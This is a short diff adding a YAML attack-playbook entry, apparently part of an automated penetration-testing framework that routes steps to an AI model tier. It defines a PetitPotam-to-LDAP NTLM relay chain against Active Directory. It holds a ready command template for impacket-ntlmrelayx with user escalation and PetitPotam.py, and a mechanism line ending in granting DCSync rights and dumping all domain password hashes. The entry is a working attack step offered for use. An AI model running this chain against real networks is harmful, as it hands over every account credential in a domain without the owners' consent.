@@ -1,0 +1,17 @@
+name: petitpotam_relay
+category: ad
+description: PetitPotam to LDAP relay chain
+preconditions:
+  - domain_joined
+  - has_cred
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "impacket-ntlmrelayx -t ldap://{dc_ip} --escalate-user '{username}' && python3 PetitPotam.py {attacker_ip} {target_ip}"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "PetitPotam coerces DC to authenticate → relay to LDAP → grant DCSync rights to controlled user → dump all domain hashes."
